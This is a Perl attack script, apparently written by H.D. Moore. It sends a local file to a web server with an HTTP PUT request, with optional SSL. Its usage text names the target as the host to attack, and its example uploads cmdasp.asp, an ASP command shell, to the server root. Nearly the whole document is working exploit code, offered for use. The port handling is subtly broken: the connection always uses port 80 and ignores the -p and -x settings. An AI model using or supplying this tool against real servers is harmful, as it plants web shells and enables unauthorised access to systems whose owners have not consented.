#!/usr/bin/perl -w
###############

use strict;
use Getopt::Std;
use Socket;

my $HAVE_SSL = 0;

# determine whether or not to enable SSL support
BEGIN {
    if (eval "require Net::SSLeay") {
        Net::SSLeay->import();
		Net::SSLeay::load_error_strings();
		Net::SSLeay::SSLeay_add_ssl_algorithms();
		Net::SSLeay::randomize(time());
		$HAVE_SSL = 1;
    }
}

my %options =  (
    TargetPort 	=> 80,
	HostPort 	=> 80,
    Mode 		=> "1.1"
);

my $VERSION = "1.0";

my %args;
getopts("h:r:f:p:xv", \%args);

if (!$args{h} || !$args{r} || !$args{f}) { usage(); }

my $binip = gethostbyname($args{h});

if (length($binip) == 0)
{
   print STDERR "The host you specified is invalid.\n";
   exit(257);
} else {
   $options{"ip"} = $binip;
   $options{"Target"} = $args{h};
}

if($args{x} && $HAVE_SSL == 0) { 
   print "Please install the Net::SSLeay module for SSL support.\n"; exit; 
}
if ($args{x}) { $options{"TargetPort"} = 443;}
if ($args{p}) { $options{"TargetPort"} = $args{p}; }

if ($args{v})
{
   print STDERR "[Options Table]\n";
   foreach my $key (keys(%options))
   {
      print STDERR "$key = " . $options{"$key"} . "\n";
   }
   print STDERR "---------------\n\n";
}

if(! -r $args{f}) { 
   print STDERR "can't open local file: '$args{f}' $!\n"; exit(1); 
}

my $data = "";
open (IN, "<".$args{f}) || die "failed to open local file: $!";
while (<IN>){ $data .= $_; }
close (IN);

my $R =
"PUT " . $args{r} . " HTTP/1.1\r\n" .
"Host: " . $args{h} . "\r\n" .
"Content-Length: " . length($data) . "\r\n".
"\r\n" . $data;

my $results = send_request($R);
print "[results]\n$results\n";


sub usage {
    print STDERR 
qq{ *- --[ $0 v$VERSION - H.D. Moore <hdmoore\@digitaldefense.net>

Usage: $0 -h <host> -l <file>
	-h <host>       = host you want to attack
	-r <remote>     = remote file name
	-f <local>      = local file name
	-p <port>       = web server port

Other Options:
	-x              = ssl mode
	-v              = verbose
    
Example:
	$0 -h target -r /cmdasp.asp -f cmdasp.asp
    	
};
    exit(1);
}

sub send_request {

   my ($request) = @_;
   my $results = "";
   my $got;
   my $ssl;
   my $ctx;
   my $res;

   if ($args{v})
   {
      print STDERR "[request]\n$request\n\n";    
   }

   select(STDOUT); $| = 1;
   socket(S,PF_INET,SOCK_STREAM, getprotobyname('tcp') || 0) || die("Socket problems\n");
   select(S); $|=1;
   select(STDOUT);

   if(connect(S,pack "SnA4x8",2,$options{"HostPort"},$options{"ip"}))
   {
      if ($args{x})
      {
         $ctx = Net::SSLeay::CTX_new() or die_now("Failed to create SSL_CTX $!");
         $ssl = Net::SSLeay::new($ctx) or die_now("Failed to create SSL $!");
         Net::SSLeay::set_fd($ssl, fileno(S));   # Must use fileno
         $res = Net::SSLeay::connect($ssl);
         $res = Net::SSLeay::write($ssl, $request);  # Perl knows how long $msg is
         shutdown S, 1;    

         while ($got = Net::SSLeay::read($ssl))
         {
            $results .= $got;
         }         

         Net::SSLeay::free ($ssl);               # Tear down connection
         Net::SSLeay::CTX_free ($ctx);
         close(S); 
      } else {
         print S $request;
         sleep(1);
         shutdown S, 1; 
         while ($got = <S>) {
            $results .= $got;
         } 
         close(S);
      }
   } else { die("Error: connection failed.\n"); }
   return $results;
}

